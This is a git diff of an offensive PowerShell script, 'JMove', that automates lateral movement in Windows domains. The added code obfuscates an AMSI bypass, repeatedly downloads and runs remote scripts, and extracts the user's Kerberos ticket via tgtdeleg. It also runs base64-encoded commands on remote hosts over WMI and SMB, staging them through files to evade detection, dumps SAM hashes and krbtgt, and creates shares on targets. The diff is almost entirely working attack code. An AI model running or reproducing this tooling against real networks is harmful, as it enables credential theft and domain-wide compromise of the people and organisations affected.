@@ -1,5 +1,8 @@
 <#
 .SYNOPSIS
+JMove - Author: Rob LP (@L3o4j)
+
+.DESCRIPTION
 1. Search for local admin access on machines in a domain or local network
 2. Check for active sessions on those machines where you have admin access
 3. Dump hashes and tickets
@@ -105,7 +108,7 @@ function Find-WMILocalAdminAccess
 					klist purge > $null
 					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
 					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
-					Invoke-Ribes -Command "asktgt /user:$env:username /password:$currentuserpassword /ptt" > $null
+					Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
 				}
 			}
 			if(($HASHorPassword) -eq "HASH"){
@@ -114,14 +117,14 @@ function Find-WMILocalAdminAccess
 					klist purge > $null
 					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
 					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
-					Invoke-Ribes -Command "asktgt /user:$env:username /password:$currentuserpassword /ptt" > $null
+					Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
 				}
 			}
 			if(($HASHorPassword) -eq "Ticket"){
 				klist purge > $null
 				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
 				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
-				Invoke-Ribes -Command "asktgt /user:$env:username /password:$currentuserpassword /ptt" > $null
+				Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
 			}
 			else{}
 		}
@@ -183,7 +186,7 @@ function Find-WMILocalAdminAccess
 					klist purge > $null
 					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
 					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
-					Invoke-Ribes -Command "asktgt /user:$env:username /password:$currentuserpassword /ptt" > $null
+					Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
 				}
 			}
 			if(($HASHorPassword) -eq "HASH"){
@@ -192,14 +195,14 @@ function Find-WMILocalAdminAccess
 					klist purge > $null
 					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
 					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
-					Invoke-Ribes -Command "asktgt /user:$env:username /password:$currentuserpassword /ptt" > $null
+					Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
 				}
 			}
 			if(($HASHorPassword) -eq "Ticket"){
 				klist purge > $null
 				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
 				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
-				Invoke-Ribes -Command "asktgt /user:$env:username /password:$currentuserpassword /ptt" > $null
+				Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
 			}
 			else{}
 		}
@@ -212,6 +215,10 @@ function Find-WMILocalAdminAccess
 		}
 
 }
+
+$ErrorActionPreference = "SilentlyContinue"
+$WarningPreference = "SilentlyContinue"
+Set-Variable MaximumHistoryCount 32767
 
 S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 
@@ -338,17 +345,14 @@ if($Username){
 		
 		else{
 			
-			Write-Host "Current domain is: " -ForegroundColor Cyan -NoNewline; Write-Host "$jcurrentdomain" -ForegroundColor Yellow
-			Write-Host "Do you want to specify a different domain ? (Leave blank for " -NoNewline; 
+			Write-Host "Domain is set to: " -ForegroundColor Cyan -NoNewline; Write-Host "$jcurrentdomain" -ForegroundColor Yellow
+			Write-Host "Do you want to specify a different domain for the User to impersonate ?"
+			Write-Host "(Leave blank for " -NoNewline;
 			Write-Host "$jcurrentdomain" -ForegroundColor Yellow -NoNewline;
 			Write-Host " or provide " -NoNewline;
 			Write-Host "FQDN" -ForegroundColor Yellow -NoNewline;
 			Write-Host ")"
 			$jtargetdomain = Read-Host
-			
-			Write-Host "Please enter your " -NoNewline;
-			Write-Host "Current User Password: " -ForegroundColor Yellow -NoNewline;
-			$currentuserpassword = Read-Host
 			
 			Write-Host ""
 			
@@ -357,6 +361,11 @@ if($Username){
 			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
 
 			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
+			
+			$CurrentUserTicket = Invoke-Ribes -Command "tgtdeleg /nowrap" | Out-String
+			$OriginalUserTicket = $CurrentUserTicket.Substring($CurrentUserTicket.IndexOf('doI'))
+			$OriginalUserTicket = $OriginalUserTicket.Trim()
+			$currentuserpassword = $OriginalUserTicket
 
 			$RubUsername = $Username.Split("\")[1].Trim()
 
@@ -876,18 +885,14 @@ if($Username){
 		
 		else{
 			
-			Write-Host "Current domain is: " -ForegroundColor Cyan -NoNewline; Write-Host "$jcurrentdomain" -ForegroundColor Yellow
-			Write-Host "Do you want to specify a different domain ? (Leave blank for " -NoNewline; 
+			Write-Host "Domain is set to: " -ForegroundColor Cyan -NoNewline; Write-Host "$jcurrentdomain" -ForegroundColor Yellow
+			Write-Host "Do you want to specify a different domain for the User to impersonate ?"
+			Write-Host "(Leave blank for " -NoNewline; 
 			Write-Host "$jcurrentdomain" -ForegroundColor Yellow -NoNewline;
 			Write-Host " or provide " -NoNewline;
 			Write-Host "FQDN" -ForegroundColor Yellow -NoNewline;
 			Write-Host ")"
 			$jtargetdomain = Read-Host
-			
-			Write-Host ""
-			Write-Host "Please enter your " -NoNewline;
-			Write-Host "Current User Password: " -ForegroundColor Yellow -NoNewline;
-			$currentuserpassword = Read-Host
 			
 			Write-Host ""
 			
@@ -896,6 +901,11 @@ if($Username){
 			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
 
 			iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
+			
+			$CurrentUserTicket = Invoke-Ribes -Command "tgtdeleg /nowrap" | Out-String
+			$OriginalUserTicket = $CurrentUserTicket.Substring($CurrentUserTicket.IndexOf('doI'))
+			$OriginalUserTicket = $OriginalUserTicket.Trim()
+			$currentuserpassword = $OriginalUserTicket
 			
 			if($DomainHASH.length -eq 32) {
 				
@@ -988,17 +998,16 @@ if($Username){
 		
 		Write-Host ""
 		
-		Write-Host "Please enter your " -NoNewline;
-		Write-Host "Current User Password: " -ForegroundColor Yellow -NoNewline;
-		$currentuserpassword = Read-Host
-		
-		Write-Host ""
-		
 		# Import Ticket
 		
 		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
 
 		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1') > $null
+		
+		$CurrentUserTicket = Invoke-Ribes -Command "tgtdeleg /nowrap" | Out-String
+		$OriginalUserTicket = $CurrentUserTicket.Substring($CurrentUserTicket.IndexOf('doI'))
+		$OriginalUserTicket = $OriginalUserTicket.Trim()
+		$currentuserpassword = $OriginalUserTicket
 		
 		Invoke-Ribes -Command "ptt /ticket:$DomainRubTicket" > $null
 		
@@ -1149,14 +1158,37 @@ if($UserName){
 		if($Username.Contains(".\")){
 			
 			$WMITargets | ForEach-Object {
-			
-				$commandtoencode = "mkdir c:\Users\Public\$eightrandom; net share $eightrandom$=c:\Users\Public\$eightrandom; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Get-LoggedInUser.ps1""); Get-LoggedInUser > c:\Users\Public\$eightrandom\$_-LoggedInUsers.txt"
 				
+				$commandtoencode = "mkdir c:\Users\Public\$eightrandom; net share $eightrandom$=c:\Users\Public\$eightrandom"
+		
 				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
 				
 				$processCommand = "powershell.exe -ep bypass -enc $base64command"
 				
-				Invoke-WmiMethod -ComputerName $_ -Credential $cred -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
+				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
+				
+				Start-Sleep 1
+				
+				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Get-LoggedInUser.ps1""); Get-LoggedInUser > c:\Users\Public\$eightrandom\$_-LoggedInUsers.txt"
+				
+				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
+				
+				$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\logons.txt`" -Value $base64command"
+				
+				$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
+				
+				$processCommand = "powershell.exe -ep bypass -enc $base64command2"
+				
+				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
+				
+				Start-Sleep 1
+				
+				$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\logons.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
+				
+				$processCommand2 = "powershell.exe -Command $Command2"
+				
+				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
+			
 			}
 			
 			Start-Sleep -Seconds 2
@@ -1213,16 +1245,30 @@ if($UserName){
 				
 			$loggedinusershashjob = $WMITargets | ForEach-Object {
 				
-				$commandtoencode = "mkdir c:\Users\Public\$eightrandom; net share $eightrandom$=c:\Users\Public\$eightrandom; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Get-LoggedInUser.ps1""); Get-LoggedInUser > c:\Users\Public\$eightrandom\$_-LoggedInUsers.txt"
+				$commandtoencode = "mkdir c:\Users\Public\$eightrandom; net share $eightrandom$=c:\Users\Public\$eightrandom"
 			
 				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
 				
+				$commandtoencode2 = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Get-LoggedInUser.ps1""); Get-LoggedInUser > c:\Users\Public\$eightrandom\$_-LoggedInUsers.txt"
+				
+				$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode2))
+				
+				$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\logons.txt`" -Value $base64command2"
+				
+				$base64command3 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
+				
+				$FinalCommand = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\logons.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
+				
 				Start-Job -ScriptBlock {
-					param($pwd, $base64command, $SMBExecUsername, $DomainHASH, $WMITarget)
+					param($pwd, $base64command, $base64command3, $FinalCommand, $SMBExecUsername, $DomainHASH, $WMITarget)
 					S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Exc.ps1')
 					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -enc $base64command"
-				} -ArgumentList $pwd, $base64command, $SMBExecUsername, $DomainHASH, $_
+					Start-Sleep 1
+					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -enc $base64command3"
+					Start-Sleep 1
+					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -Command $FinalCommand"
+				} -ArgumentList $pwd, $base64command, $base64command3, $FinalCommand, $SMBExecUsername, $DomainHASH, $_
 			}
 
 			Wait-Job $loggedinusershashjob > $null
@@ -1413,7 +1459,10 @@ $EnterpriseAdmins
 
 ##### Merge content of Domain and Enterprise admins into one variable
 
-$AllAdminUsers = $DomainAdmins + $EnterpriseAdmins
+$DomainAdminsArray = $DomainAdmins -split "\r?\n"
+$EnterpriseAdminsArray = $EnterpriseAdmins -split "\r?\n"
+$AllAdminUsers = $DomainAdminsArray + $EnterpriseAdminsArray
+$AllAdminUsersString = $AllAdminUsers -join "`n"
 
 ##### Sort Unique
 
@@ -1487,56 +1536,71 @@ Write-Host ""
 if($Username.Contains(".\") -AND $HASHorPassword -eq "HASH"){}
 
 else{
-	Write-Host "Dumping SAM from targets..." -ForegroundColor Yellow
-	iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1") > $null
-	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')
-	$PwshModule = (Get-Module)
+	Write-Host "Attempting to dump SAM from targets..." -ForegroundColor Yellow
+	#iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1") > $null
+	#iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')
+	<# $PwshModule = (Get-Module)
 	if($PwshModule -Like "*dynamic*code*module*Microsoft*"){}
 	else{
 		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/AD_Module.ps1')
 		Import-ActiveDirectory
-	}
+	} #>
 
 	$SAMTargets = $null
 	$SAMTargets = $WMITargets
 	
-	$DomainControllers = (Get-ADDomainController | Select-Object -ExpandProperty Name)
+	<# $DomainControllers = (Get-ADDomainController | Select-Object -ExpandProperty Name)
 	foreach($DomainController in $DomainControllers){
 		$SAMTargets = ($SAMTargets | Where-Object {$_ -notlike "$DomainController*"})
-	}
+	} #>
 	
 	if($Username){
 
 		if($HASHorPassword -eq "Password"){
 			
 			if($Username.Contains(".\")){
-				$SAMTargetsJoin = $SAMTargets -join ","
-				Get-Sam -Command "-target=$SAMTargetsJoin -d=. -u=$SMBExecUsername -p=$Password" | Out-File $pwd\SAM_Dumps.txt
+				foreach ($SAMTarget in $SAMTargets) {
+					$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command ""-target=$SAMTarget -d=$SAMTarget -u=$SMBExecUsername -p=$Password"" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
+					$enccommands = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commands))
+					Start-Process PowerShell.exe -WindowStyle Hidden -ArgumentList "-EncodedCommand $enccommands"
+				}
 			}
 			
 			else{
-				$SAMTargetsJoin = $SAMTargets -join ","
-				Get-Sam -Command "-target=$SAMTargetsJoin" | Out-File $pwd\SAM_Dumps.txt
+				foreach ($SAMTarget in $SAMTargets) {
+					$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command ""-target=$SAMTarget"" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
+					$enccommands = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commands))
+					Start-Process PowerShell.exe -WindowStyle Hidden -ArgumentList "-EncodedCommand $enccommands"
+				}
 			}
 		}
 		
 		elseif($HASHorPassword -eq "HASH"){
 			if($Username.Contains(".\")){}
 			else{
-				$SAMTargetsJoin = $SAMTargets -join ","
-				Get-Sam -Command "-target=$SAMTargetsJoin" | Out-File $pwd\SAM_Dumps.txt
+				foreach ($SAMTarget in $SAMTargets) {
+					$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command ""-target=$SAMTarget"" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
+					$enccommands = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commands))
+					Start-Process PowerShell.exe -WindowStyle Hidden -ArgumentList "-EncodedCommand $enccommands"
+				}
 			}
 		}
 		
 		elseif($HASHorPassword -eq "Ticket"){
-			$SAMTargetsJoin = $SAMTargets -join ","
-			Get-Sam -Command "-target=$SAMTargetsJoin" | Out-File $pwd\SAM_Dumps.txt
+			foreach ($SAMTarget in $SAMTargets) {
+				$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command ""-target=$SAMTarget"" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
+				$enccommands = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commands))
+				Start-Process PowerShell.exe -WindowStyle Hidden -ArgumentList "-EncodedCommand $enccommands"
+			}
 		}
 	}
 
 	else{
-		$SAMTargetsJoin = $SAMTargets -join ","
-		Get-Sam -Command "-target=$SAMTargetsJoin" | Out-File $pwd\SAM_Dumps.txt
+		foreach ($SAMTarget in $SAMTargets) {
+			$commands = "iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1')); iex((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1')); Get-Sam -Command `"-target=$SAMTarget`" | Out-File $pwd\$($SAMTarget)_SAM_Dumps.txt"
+			$enccommands = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commands))
+			Start-Process PowerShell.exe -WindowStyle Hidden -ArgumentList "-EncodedCommand $enccommands"
+		}
 	}
 
 	Write-Host "Done..."
@@ -1556,13 +1620,35 @@ if($Username){
 			
 			$WMITargets | ForEach-Object {
 			
-				$commandtoencode = "iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") | Out-File c:\Users\Public\$eightrandom\$_.txt; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1""); Get-Sam -Command ""-target=127.0.0.1"" >> c:\Users\Public\$eightrandom\$_.txt; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1""); Invoke-Ribes -Command ""dump /service:krbtgt /nowrap"" >> c:\Users\Public\$eightrandom\$_.txt"
+				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1`"); iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/dumper.ps1`") *> c:\Users\Public\$eightrandom\$_.txt"
+				
+				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
+				
+				$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\temp.txt`" -Value $base64command"
+				
+				$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
+				
+				$processCommand = "powershell.exe -ep bypass -enc $base64command2"
+				
+				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
+				
+				Start-Sleep 1
+				
+				$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
+				
+				$processCommand2 = "powershell.exe -Command $Command2"
+				
+				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
+				
+				Start-Sleep 1
+				
+				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") >> c:\Users\Public\$eightrandom\$_.txt"
 				
 				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
 				
 				$processCommand = "powershell.exe -ep bypass -enc $base64command"
-			
-				Invoke-WmiMethod -ComputerName $_ -Credential $cred -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
+				
+				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
 			
 			}
 			
@@ -1589,7 +1675,39 @@ if($Username){
 			
 			$WMITargets | ForEach-Object {
 			
-				$commandtoencode = "mkdir c:\Users\Public\$eightrandom; net share $eightrandom$=c:\Users\Public\$eightrandom; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") | Out-File c:\Users\Public\$eightrandom\$_.txt; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1""); Get-Sam -Command ""-target=127.0.0.1"" >> c:\Users\Public\$eightrandom\$_.txt; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1""); Invoke-Ribes -Command ""dump /service:krbtgt /nowrap"" >> c:\Users\Public\$eightrandom\$_.txt"
+				$commandtoencode = "mkdir c:\Users\Public\$eightrandom; net share $eightrandom$=c:\Users\Public\$eightrandom"
+		
+				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
+				
+				$processCommand = "powershell.exe -ep bypass -enc $base64command"
+				
+				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
+				
+				Start-Sleep 1
+					
+				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1`"); iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/dumper.ps1`") *> c:\Users\Public\$eightrandom\$_.txt"
+				
+				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
+				
+				$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\temp.txt`" -Value $base64command"
+				
+				$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
+				
+				$processCommand = "powershell.exe -ep bypass -enc $base64command2"
+				
+				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
+				
+				Start-Sleep 1
+				
+				$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
+				
+				$processCommand2 = "powershell.exe -Command $Command2"
+				
+				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
+				
+				Start-Sleep 1
+				
+				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") >> c:\Users\Public\$eightrandom\$_.txt"
 				
 				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
 				
@@ -1632,16 +1750,30 @@ if($Username){
 				
 			$dumpinghashesjob = $WMITargets | ForEach-Object {
 				
-				$commandtoencode = "iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") | Out-File c:\Users\Public\$eightrandom\$_.txt; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1""); Get-Sam -Command ""-target=127.0.0.1"" >> c:\Users\Public\$eightrandom\$_.txt; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1""); Invoke-Ribes -Command ""dump /service:krbtgt /nowrap"" >> c:\Users\Public\$eightrandom\$_.txt"
-			
+				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1`"); iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/dumper.ps1`") *> c:\Users\Public\$eightrandom\$_.txt"
+				
 				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
 				
+				$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\temp.txt`" -Value $base64command"
+				
+				$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
+				
+				$FinalCommand = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
+				
